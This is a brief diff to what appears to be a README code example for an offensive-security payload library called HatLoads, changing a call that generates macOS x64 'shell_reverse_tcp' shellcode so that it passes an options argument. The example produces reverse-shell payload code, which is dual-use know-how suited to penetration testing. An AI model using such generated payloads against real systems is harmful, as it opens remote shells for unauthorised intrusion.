@@ -43,5 +43,10 @@ options = {
 }
 
 hatloads = HatLoads()
-shellcode = hatloads.get_payload('macos', 'x64', 'shell_reverse_tcp')
+shellcode = hatloads.get_payload(
+    'macos',
+    'x64',
+    'shell_reverse_tcp',
+    options
+)
 ```
